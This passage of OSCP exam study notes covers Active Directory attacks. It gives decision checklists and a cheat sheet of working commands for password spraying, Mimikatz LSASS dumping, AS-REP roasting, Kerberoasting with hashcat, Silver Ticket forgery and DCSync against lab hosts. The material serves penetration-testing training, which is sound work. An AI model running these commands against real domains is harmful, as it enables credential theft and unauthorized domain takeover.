> 4. Calculate a safe spray rate below the lockout threshold.
> 5. Prefer a low-noise mechanism when possible.

> [!check]
> **If you have one valid domain credential**
> 1. Look for users with `DONT_REQUIRE_PREAUTH` → AS-REP Roast.
> 2. Look for user-linked SPNs → Kerberoast.
> 3. Check whether the credential is local admin on any reachable host.
> 4. If local admin, inspect LSASS/tickets for better credentials.
> 5. Re-enumerate AD with the newly obtained identity.

> [!check]
> **If you obtain a service-account hash**
> 1. Crack it if feasible.
> 2. Determine what SPN/service it controls.
> 3. If you possess the service secret and required SID/SPN details, consider a Silver Ticket for that service.

> [!check]
> **If you obtain Domain Admin / replication rights**
> 1. DCSync specific high-value users.
> 2. Record NTLM/Kerberos key material.
> 3. Use the next chapter's lateral-movement techniques to leverage the secrets.

---

# Mini OSCP cheat sheet

These are the commands/reminders most useful to keep beside you during a lab.

```powershell
# 1. Check domain password/lockout policy
net accounts
```

```powershell
# 2. LDAP credential test with DirectoryEntry
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

```powershell
# 3. PowerShell password spray
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```

```bash
# 4. SMB password spray
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```

```bash
# 5. Check whether one credential is local admin
crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
# Look for: (Pwn3d!)
```

```powershell
# 6. Kerberos password spray
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```

```text
# 7. Mimikatz: enable LSASS access + dump cached credentials
privilege::debug
sekurlsa::logonpasswords
```

```text
# 8. Mimikatz: list cached Kerberos tickets
sekurlsa::tickets
```

```bash
# 9. AS-REP Roast from Kali
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
```

```bash
# 10. Crack AS-REP etype 23
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

```powershell
# 11. AS-REP Roast from Windows
.\Rubeus.exe asreproast /nowrap
```

```powershell
# 12. Find users with preauthentication disabled
Get-DomainUser -PreauthNotRequired
```

```powershell
# 13. Kerberoast from Windows
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

```bash
# 14. Kerberoast from Kali
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```

```bash
# 15. Crack TGS-REP etype 23
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

```powershell
# 16. Domain SID helper
whoami /user
# Remove the final RID from the returned SID.
```

```text
# 17. Forge/inject Silver Ticket
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```

```powershell
# 18. Verify Kerberos cache / ticket injection
klist
```

```text
# 19. DCSync from Windows
lsadump::dcsync /user:corp\dave
```

```bash
# 20. DCSync from Kali
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

### Hashcat modes to memorize

| Material | Hashcat mode |
|---|---:|
| NTLM | `1000` |
| Kerberos AS-REP etype 23 | `18200` |
| Kerberos TGS-REP etype 23 | `13100` |

### Fast mental decision tree

```text
Have usernames but no password?
  -> Check lockout policy -> password spray
  -> Check preauth-disabled users -> AS-REP Roast

Have one valid domain user?
  -> Enumerate SPNs -> Kerberoast
  -> Check local-admin access on hosts
  -> If local admin -> dump LSASS/tickets

Have a service account secret/hash?
  -> Crack/reuse as appropriate
  -> Consider Silver Ticket for its SPN

Have Domain Admin / replication rights?
  -> DCSync high-value accounts
  -> Feed hashes/tickets into lateral-movement phase
```

---

# Exam-focused takeaways

1. **Always respect lockout policy before spraying.** A correct attack performed too aggressively can destroy your path.
2. **AS-REP Roasting requires a user with preauthentication disabled.** The hash is cracked offline with mode `18200` for the chapter's etype 23 example.
3. **Kerberoasting requires only authenticated domain access plus an SPN worth targeting.** The chapter's etype 23 TGS hashes use mode `13100`.
4. **Local admin on a machine with interesting sessions can be more valuable than it first appears.** LSASS may hold hashes and tickets for other domain users/services.
5. **Silver Ticket = service-level forgery.** You need the target service account secret, domain SID, and SPN/service information.
6. **DCSync = domain replication abuse.** It is a late-stage, high-impact credential attack that can retrieve secrets for arbitrary domain users when you control the necessary replication rights.
7. **Re-enumerate after every credential gain.** A new user may have new group memberships, new local-admin access, new ACL rights, or access to systems where stronger credentials are cached.

